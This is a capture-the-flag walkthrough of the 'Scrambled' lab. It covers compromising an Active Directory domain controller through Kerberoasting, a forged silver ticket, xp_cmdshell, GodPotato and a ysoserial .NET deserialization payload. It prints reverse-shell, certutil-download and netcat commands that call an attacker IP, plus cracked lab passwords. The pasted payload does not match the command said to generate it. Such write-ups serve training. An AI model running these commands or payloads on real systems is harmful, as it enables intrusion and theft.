![image.png](/assets/images/Scrambled_HTB/image%205.png)

This page is leaking a potential username **ksimpson** on the domain and an email of **support@scramblecorp.com.**

Adding that username to our usernames.txt file.

Now looking at the **Request a Password Reset** link we have this page.

![image.png](/assets/images/Scrambled_HTB/image%206.png)

This says that the password reset system is down and if no one is available from the IT support, the password gets the same as the username which is a big hint for us.

### SMB Enumeration

Now that we have 2 hints from the web enumeration that we have kerberos authentication and the password can be same as the username.

We also have a username **Ksimpson.**

```bash
nxc smb scrm.local -u 'ksimpson' -p 'ksimpson'
```

![image.png](/assets/images/Scrambled_HTB/image%207.png)

**NTLM Disabled ⬆️**

---

So lets first generate a krb5.conf file using NetExec.

```bash
nxc smb scrm.local --generate-krb5-file scrm.conf
```

![image.png](/assets/images/Scrambled_HTB/image%208.png)

Now we will copy this config to /etc/krb5.conf file.

Now lets try to authenticate.

```bash
nxc smb dc1.scrm.local -k -u 'ksimpson' -p 'ksimpson'
```

![image.png](/assets/images/Scrambled_HTB/image%209.png)

We have successful authentication, now lets enumerate shares on the box.

```bash
nxc smb dc1.scrm.local -k -u 'ksimpson' -p 'ksimpson' --shares
```

![image.png](/assets/images/Scrambled_HTB/image%2010.png)

As **ksimpson** we have access to the **Public** share on the box.

Lets now first generate a TGT for **ksimpson.**

```bash
kinit ksimpson
```

![image.png](/assets/images/Scrambled_HTB/image%2011.png)

Using smbclient.py to connect the share.

```bash
smbclient //dc1.scrm.local/Public -U 'ksimpson'%'ksimpson' -k
```

![image.png](/assets/images/Scrambled_HTB/image%2012.png)

Taking a look at this **Network Security Changes.pdf** file.

![image.png](/assets/images/Scrambled_HTB/image%2013.png)

It said that we have to use kerberos authentication and Only the network administrators have the access to the SQL service.

---

Lets do a rid bruteforce attack using our SMB authentication.

```bash
nxc smb dc1.scrm.local -k -u 'ksimpson' -p 'ksimpson' --rid-brute
```

```text
SMB                      dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB                      dc1.scrm.local  445    dc1              [+] scrm.local\ksimpson:ksimpson 
SMB                      dc1.scrm.local  445    dc1              498: SCRM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              500: SCRM\administrator (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              501: SCRM\Guest (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              502: SCRM\krbtgt (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              512: SCRM\Domain Admins (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              513: SCRM\Domain Users (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              514: SCRM\Domain Guests (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              515: SCRM\Domain Computers (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              516: SCRM\Domain Controllers (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              517: SCRM\Cert Publishers (SidTypeAlias)
SMB                      dc1.scrm.local  445    dc1              518: SCRM\Schema Admins (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              519: SCRM\Enterprise Admins (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              520: SCRM\Group Policy Creator Owners (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              521: SCRM\Read-only Domain Controllers (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              522: SCRM\Cloneable Domain Controllers (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              525: SCRM\Protected Users (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              526: SCRM\Key Admins (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              527: SCRM\Enterprise Key Admins (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              553: SCRM\RAS and IAS Servers (SidTypeAlias)
SMB                      dc1.scrm.local  445    dc1              571: SCRM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      dc1.scrm.local  445    dc1              572: SCRM\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      dc1.scrm.local  445    dc1              1000: SCRM\DC1$ (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1101: SCRM\DnsAdmins (SidTypeAlias)
SMB                      dc1.scrm.local  445    dc1              1102: SCRM\DnsUpdateProxy (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              1106: SCRM\tstar (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1107: SCRM\asmith (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1109: SCRM\ProductionFloor1 (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              1114: SCRM\ProductionShare (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              1115: SCRM\AllUsers (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              1118: SCRM\sjenkins (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1119: SCRM\sdonington (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1120: SCRM\WS01$ (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1601: SCRM\backupsvc (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1603: SCRM\jhall (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1604: SCRM\rsmith (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1605: SCRM\ehooker (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1606: SCRM\SalesUsers (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              1608: SCRM\HRShare (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              1609: SCRM\ITShare (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              1610: SCRM\ITUsers (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              1611: SCRM\khicks (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1612: SCRM\SalesShare (SidTypeGroup)
SMB                      dc1.scrm.local  445    dc1              1613: SCRM\sqlsvc (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1616: SCRM\SQLServer2005SQLBrowserUser$DC1 (SidTypeAlias)
SMB                      dc1.scrm.local  445    dc1              1617: SCRM\miscsvc (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1619: SCRM\ksimpson (SidTypeUser)
SMB                      dc1.scrm.local  445    dc1              1620: SCRM\NoAccess (SidTypeGroup)

```

The above users and machine accounts were captured, lets prettify it to make a usernames.txt file.

```text
administrator
Guest
krbtgt
tstar
asmith
ProductionFloor1
ProductionShare
AllUsers
sjenkins
sdonington
WS01$
backupsvc
jhall
rsmith
ehooker
SalesUsers
HRShare
ITShare
ITUsers
khicks
SalesShare
sqlsvc
SQLServer2005SQLBrowserUser$DC1
miscsvc
ksimpson
NoAccess
```

We have a total of 26 users and machine accounts on the domain.

### Bloodhound

We have valid credentials for the user **ksimpson** lets dump the ldap data using rusthound-ce for graphical analysis.

```bash
rusthound-ce -d scrm.local -u 'ksimpson' -p 'ksimpson' -f dc1.scrm.local -c All -z --ldaps
```

![image.png](/assets/images/Scrambled_HTB/image%2014.png)

Now lets analyze it in Bloodhound-ce.

## Exploitation

### Kerberoasting

Marking user **Ksimpson** as owned in bloodhound.

![image.png](/assets/images/Scrambled_HTB/image%2015.png)

We dont have any outbound object control from our owned user, so lets take a look at the premade cypher queries.

Looking at the **All Kerberoastable users.**

![image.png](/assets/images/Scrambled_HTB/image%2016.png)

We have **SQLSVC** as kerberoastable.

Lets kerberoast it using targetedkerberoast.py from the impacket collection.

```bash
/opt/targetedKerberoast/targetedKerberoast.py -v -u 'ksimpson' -k -d 'scrm.local' --dc-host dc1.scrm.local --use-ldaps
```

![image.png](/assets/images/Scrambled_HTB/image%2017.png)

Saving this hash to a hashes.txt file.

### Hash Cracking

Lets crack that **SQLSVC** account hash using hashcat.

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Scrambled_HTB/image%2018.png)

We have the password for **SQLSVC** account saving it to creds.txt file.

### SMB Enumeration 2

![image.png](/assets/images/Scrambled_HTB/image%2019.png)

Marking **SQLSVC** owned in bloodhound but we didn’t have any outbound control objects from this user.

But we do have **Execution Privileges** on them as **SQL ADMINS RIGHTS.**

![image.png](/assets/images/Scrambled_HTB/image%2020.png)

As **SQLSVC** we are SQLAdmin on DC.

Lets try to list some shares as **SQLSVC.** I will get a TGT for the SQLSVC user for the kerberos authentication.

```bash
impacket-getTGT scrm.local/'sqlsvc':Pegasus60
export KRB5CCNAME=sqlsvc.ccache
klist
```

![image.png](/assets/images/Scrambled_HTB/image%2021.png)

As **SQLSVC** user we dont have any access to any new share.

### MSSQL Exploitation

Lets check for the MSSQL access by connecting to the server using mssqlclient.py 

Exporting the **SQLSVC** TGT to our env variable.

![image.png](/assets/images/Scrambled_HTB/image%2022.png)

But it was failing, also in the bloodhound data we have a SPN set on the **SQLSVC** account.

Let generate a Silver Ticket.

```bash
impacket-getST -spn 'MSSQLSvc/dc1.scrm.local' scrm.local/'SQLSVC':'Pegasus60'
```

![image.png](/assets/images/Scrambled_HTB/image%2023.png)

But it still failed and we cant login into MSSQL.

Lets forge a Silver Ticket using impacket’s Ticketer.py impersonating Administrator.

To do that we need Domain SID.

```bash
nxc ldap dc1.scrm.local -k -u 'ksimpson' -p 'ksimpson' --get-sid
```

![image.png](/assets/images/Scrambled_HTB/image%2024.png)

Now we also need the NT Hash of our **SQLSVC** user.

Used a online NTLM hash generator and got this hash 

```text
SQLSVC:b999a16500b87d17ec7f2e2a68778f05
```

Now lets generate a ticket.

```bash
impacket-ticketer -spn 'MSSQLSvc/DC1.SCRM.LOCAL' -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -user-id 500 -nthash b999a16500b87d17ec7f2e2a68778f05 AdministratorSql
```

![image.png](/assets/images/Scrambled_HTB/image%2025.png)

Exporting the Silver Ticket to our environment variable.

![image.png](/assets/images/Scrambled_HTB/image%2026.png)

Lets now try to connect to the MSSQL server with Admin access.

```bash
impacket-mssqlclient -p 1433 -k -no-pass dc1.scrm.local
```

![image.png](/assets/images/Scrambled_HTB/image%2027.png)

And we have a shell as the admin of the MSSQL.

## Unintended Way

This is an unintended way of solving this box, the intended way is after this.

### Shell as NT AUTHORITY\SYSTEM

We have permissions to enable the xp_cmdshell.

![image.png](/assets/images/Scrambled_HTB/image%2028.png)

Enabling it and executing commands.

We are going to use **Hoaxshell** to get a reverse shell on the box.

```bash
/opt/hoaxshell/hoaxshell.py -s 10.10.14.19 -p 9090
```

![image.png](/assets/images/Scrambled_HTB/image%2029.png)

![image.png](/assets/images/Scrambled_HTB/image%2030.png)

Got a Shell as **SQLSVC**.

---

Looking at the privileges we have as SQLSVC.

```powershell
whoami /priv
```

![image.png](/assets/images/Scrambled_HTB/image%2031.png)

The **SeImpersonatePrivilege** is enabled on the box.

Uploading a **GodPotato** to the box to gain administrator privileges.

```powershell
certutil.exe -urlcache -split -f "http://10.10.14.19:9999/gp.exe"
```

![image.png](/assets/images/Scrambled_HTB/image%2032.png)

Also uploading **nc.exe** to the remote server.

```powershell
certutil.exe -urlcache -split -f "http://10.10.14.19:9999/nc64.exe"
```

![image.png](/assets/images/Scrambled_HTB/image%2033.png)

Now starting a listener on our Attacker machine.

```powershell
nc -lnvp 9099
```

Now executing…

```powershell
./gp.exe -cmd "./nc64.exe -t -e C:\windows\system32\cmd.exe 10.10.14.19 9099"
```

![image.png](/assets/images/Scrambled_HTB/image%2034.png)

![image.png](/assets/images/Scrambled_HTB/image%2035.png)

Gave us a shell as **NT AUTHORITY\SYSTEM**.

Lets retrieve our both the user.txt and root.txt flags.

![image.png](/assets/images/Scrambled_HTB/image%2036.png)

Yeah! But that was the unintended way of solving this box.

Now lets move on to the Intended way of doing it.

## Intended Way

### MSSQL Enumeration

After logging in as **SQLSVC** to the MSSQL database.

Lets list all the databases on the server.

```sql
SELECT name FROM sys.databases;
```

![image.png](/assets/images/Scrambled_HTB/image%2037.png)

We are going to use ScrambleHR database.

```sql
use ScrambleHR
SELECT name FROM sys.tables;

```

![image.png](/assets/images/Scrambled_HTB/image%2038.png)

Lets first see the Employees table.

```sql
SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Employees';
SELECT * FROM employee;
```

![image.png](/assets/images/Scrambled_HTB/image%2039.png)

Nothing here !

Lets enumerate the **UserImport** Table.

```sql
SELECT * FROM UserImport;
```

![image.png](/assets/images/Scrambled_HTB/image%2040.png)

We have credentials for the **MiscSvc** User, saving those credentials to creds.txt file.

As of for our last table **TimeSheets** it was found to be empty.

### Shell as MiscSvc

Let verify the credentials obtained from the MSSQL database.

```bash
nxc ldap dc1.scrm.local -k -u 'MiscSvc' -p 'ScrambledEggs9900'
```

![image.png](/assets/images/Scrambled_HTB/image%2041.png)

Checking for winRM privileges, lets get a TGT first.

```bash
impacket-getTGT scrm.local/MiscSvc:'ScrambledEggs9900'
```

![image.png](/assets/images/Scrambled_HTB/image%2042.png)

![image.png](/assets/images/Scrambled_HTB/image%2043.png)

NetExec winrm only supports NTLM.

So lets try and login with Evil-Winrm directly.

```bash
evil-winrm -i dc1.scrm.local -u 'MiscSvc' -r 'scrm.local'
```

![image.png](/assets/images/Scrambled_HTB/image%2044.png)

And we have a shell !

![image.png](/assets/images/Scrambled_HTB/image%2045.png)

Grabbing our user.txt and submitting it.

### SMB Enumeration 3

Now there’s nothing more we can do in the shell as **MiscSvc** user.

Also after gaining control over **MiscSvc** user we now have access to the **IT** share on the box as displayed in bloodhound.

![image.png](/assets/images/Scrambled_HTB/image%2046.png)

Lets again check permissions using NetExec.

```bash
nxc smb dc1.scrm.local -k --use-kcache --shares
```

![image.png](/assets/images/Scrambled_HTB/image%2047.png)

Using SMBCLIENT to connect to the share.

```bash
smbclient //dc1.scrm.local/IT -k
```

![image.png](/assets/images/Scrambled_HTB/image%2048.png)

Downloading every possible files on the IT share.

```bash
mask ""
prompt off
recurse on
mget *
```

![image.png](/assets/images/Scrambled_HTB/image%2049.png)

We only received a **ScrambleClient.exe** which is stored in Apps/Sales Order Client/ and a .dll file named ScrambleLib.dll which is also in the same location.

### Reverse Engineering the .NET Assembly

We have downloaded 2 files from the SMB IT share.

![image.png](/assets/images/Scrambled_HTB/image%2050.png)

opening this file in a Windows Commando VM cause its a .NET Assembly.

We have this window.

![image.png](/assets/images/Scrambled_HTB/image%2051.png)

I edited the server as dc1.scrm.local and through nmap results we know that the client is working on port 4411.

Using ksimpson as logon we failed!

![image.png](/assets/images/Scrambled_HTB/image%2052.png)

Tried with the MiscSvc user too but it also failed.

So lets try to open this ScrambledClient.exe file in DNSPY.

Looking at the **ScrambledClient.exe,** under classes **Logon(object)**

![image.png](/assets/images/Scrambled_HTB/image%2053.png)

```csharp
// ScrambleClient.LoginWindow
// Token: 0x0600003B RID: 59 RVA: 0x0000294C File Offset: 0x00000B4C
private void Logon(object CredsObject)
{
  bool logonSuccess = false;
  string errorMessage = string.Empty;
  NetworkCredential networkCredential = (NetworkCredential)CredsObject;
  try
  {
    logonSuccess = this._Client.Logon(networkCredential.UserName, networkCredential.Password);
  }
  catch (Exception ex)
  {
    errorMessage = ex.Message;
  }
  finally
  {
    this.LoginComplete(logonSuccess, errorMessage);
  }
}
```

Its taking the logon credential username and password.

Now lets inspect the **ScrambledLib.dll,** looking at the **Logon(object)** class.

![image.png](/assets/images/Scrambled_HTB/image%2054.png)

```csharp
// ScrambleLib.ScrambleNetClient
// Token: 0x0600002B RID: 43 RVA: 0x000023D4 File Offset: 0x000005D4
public bool Logon(string Username, string Password)
{
bool result;
try
{
  if (string.Compare(Username, "scrmdev", true) == 0)
  {
    Log.Write("Developer logon bypass used");
    result = true;
  }
  else
  {
    HashAlgorithm hashAlgorithm = MD5.Create();
    byte[] bytes = Encoding.ASCII.GetBytes(Password);
    Convert.ToBase64String(hashAlgorithm.ComputeHash(bytes, 0, bytes.Length));
    ScrambleNetResponse scrambleNetResponse = this.SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.AuthenticationRequest, Username + "|" + Password));
    ScrambleNetResponse.ResponseType type = scrambleNetResponse.Type;
    if (type != ScrambleNetResponse.ResponseType.Success)
    {
      if (type != ScrambleNetResponse.ResponseType.InvalidCredentials)
      {
        throw new ApplicationException(scrambleNetResponse.GetErrorDescription());
      }
      Log.Write("Logon failed due to invalid credentials");
      result = false;
    }
    else
    {
      Log.Write("Logon successful");
      result = true;
    }
  }
}
catch (Exception ex)
{
  Log.Write("Error: " + ex.Message);
  throw ex;
}
return result;
}

```

By analyzing the above code we can say that the user **SCRMDEV** can bypass the login and any other user has to have a password to login.

### Wireshark

Lets now start a Wireshark session on our windows host to capture what is happening on the connection with the port 4411 on our windows OpenVPN network adapter.

![image.png](/assets/images/Scrambled_HTB/image%2055.png)

Also we have to add **DC1.SCRM.LOCAL** to our /etc/hosts file in windows machine too.

![image.png](/assets/images/Scrambled_HTB/image%2056.png)

Now I will start the application **ScrambledClient.exe** and login with **SCRMDEV** without a password and capture what is happening.

![image.png](/assets/images/Scrambled_HTB/image%2057.png)

We have two orders present in the database as such and wireshark has sniffed a good amount of traffic after logging in.

![image.png](/assets/images/Scrambled_HTB/image%2058.png)

Looking at the Red highlighted area we follow its TCP Stream.

![image.png](/assets/images/Scrambled_HTB/image%2059.png)

The application running on port 4411 is listing orders in this format.

And from DNSPY we have that it it all base64 encrypted data, after decoding it with base64 we still have to decrypt the data to be able to read it.

What I will now do is create a new order in the application and check for new captures.

![image.png](/assets/images/Scrambled_HTB/image%2060.png)

Uploading it and looking at the traffic in Wireshark

![image.png](/assets/images/Scrambled_HTB/image%2061.png)

Again we follow the TCP stream of the red highlighted packet cause it is of larger length.

![image.png](/assets/images/Scrambled_HTB/image%2062.png)

We see that **UPLOAD_ORDER** is the function used to upload the data to the server.

Now we only need the payload which should be in this format cause server only understands that.

And from reverse engineering the binary, we have this **SalesOrder** class.

```csharp
// Token: 0x06000024 RID: 36 RVA: 0x000022C0 File Offset: 0x000004C0
  public string SerializeToBase64()
  {
    BinaryFormatter binaryFormatter = new BinaryFormatter();
    Log.Write("Binary formatter init successful");
    string result;
    using (MemoryStream memoryStream = new MemoryStream())
    {
      binaryFormatter.Serialize(memoryStream, this);
      result = Convert.ToBase64String(memoryStream.ToArray());
    }
    return result;
  }
```

This says that it is a **Binary Formatter** that is encrypting the base64 string.

### Shell as NT AUTHORITY\SYSTEM

Now lets form an attack path to exploit this application.

We send our payload by connecting to this remote service using nc64.exe

```csharp
UPLOAD_ORDER;<OUR BINARY FORMATTER PAYLOAD>
```

We are going to use **ysoserial** from github.

[https://github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)

This tool helps to build us the serialized payload.

Lets now first drop a nc64.exe on the box using the **MiscSvc** user shell.

![image.png](/assets/images/Scrambled_HTB/image%2063.png)

Our nc64.exe got uploaded !

Now lets generate a payload that will trigger this nc64.exe

```powershell
./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Users\miscsvc\documents\nc64.exe 10.10.14.19 9999 -e cmd.exe"
```

This generated me this payload.

```text
AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAL8DAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA4QU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgQzpcXHByb2dyYW1kYXRhXFxuYzY0LmV4ZSAxMC4xMC4xNC42IDQ0NCAtZSBjbWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL
```

Now connecting to the remote service using netcat.

```bash
nc dc1.scrm.local 4411
```

![image.png](/assets/images/Scrambled_HTB/image%2064.png)

Although we get an error back but in our netcat lister we get a callback.

```bash
nc -lnvp 9999
```

![image.png](/assets/images/Scrambled_HTB/image%2065.png)

Submitting the root.txt in the adminsitrator’s desktop.

Rooted!

![image.png](/assets/images/Scrambled_HTB/image%2066.png)

Thanks for reading 😊
